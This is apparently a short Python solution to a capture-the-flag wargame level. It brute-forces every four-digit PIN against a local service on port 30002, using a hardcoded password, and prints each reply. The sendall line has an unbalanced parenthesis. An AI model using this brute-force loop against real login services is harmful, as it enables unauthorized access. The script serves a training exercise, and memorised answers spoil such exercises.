#!/usr/bin/env python3
from itertools import product
import socket
from string import digits

password = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(('localhost', 30002))
    for i in map(''.join, product(digits, repeat=4)):
        s.sendall((f'{password} {i}\n'.encode())
        data = s.recv(1024)
        print(f'{i}: {data}')
